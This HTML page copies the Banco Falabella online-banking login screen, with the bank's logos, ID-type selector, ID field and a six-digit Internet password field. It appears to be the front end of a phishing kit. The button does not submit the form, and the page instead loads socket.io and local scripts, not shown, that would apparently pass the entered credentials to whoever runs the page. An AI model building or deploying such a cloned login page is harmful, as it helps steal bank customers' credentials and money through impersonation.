<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Falabella - Banca en línea</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
        <img src="img/logo-bf-darkmode.aee74748.svg" alt="Logo" class="loading-logo">
    </div>

    <!-- Main Content -->
    <div id="mainContent" class="main-container">
        <!-- Header -->
        <header class="header">
            <div class="logo-container">
                <img src="img/bf-logo-mobile.svg" alt="Banco Falabella" class="logo">
            </div>
            <button class="btn-banca-online">Banca en línea</button>
        </header>

        <!-- Login Form -->
        <div class="login-container">
            <form id="loginForm" class="login-form">
                <div class="form-group">
                    <select id="docType" class="form-select">
                        <option value="cedula_ciudadania">Cédula Ciudadanía</option>
                        <option value="cedula_extranjeria">Cédula Extranjería</option>
                        <option value="pasaporte">Pasaporte</option>
                    </select>
                </div>

                <div class="form-group">
                    <input 
                        type="text" 
                        id="cedula" 
                        class="form-input" 
                        placeholder="Cédula de Ciudadanía"
                        maxlength="10"
                        inputmode="numeric"
                        autocomplete="off"
                    >
                </div>

                <div class="form-group">
                    <input 
                        type="password" 
                        id="claveInternet" 
                        class="form-input" 
                        placeholder="Clave Internet"
                        maxlength="6"
                        inputmode="numeric"
                        autocomplete="off"
                    >
                </div>

                <button type="button" id="btnIngresar" class="btn-ingresar" disabled>
                    INGRESAR
                </button>

                <div class="link-container">
                    <a href="#" class="link-clave">Crea o recupera tu Clave Internet</a>
                </div>
            </form>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/banco-utils.js"></script>
    <script src="script-optimized.js"></script>
</body>
</html>
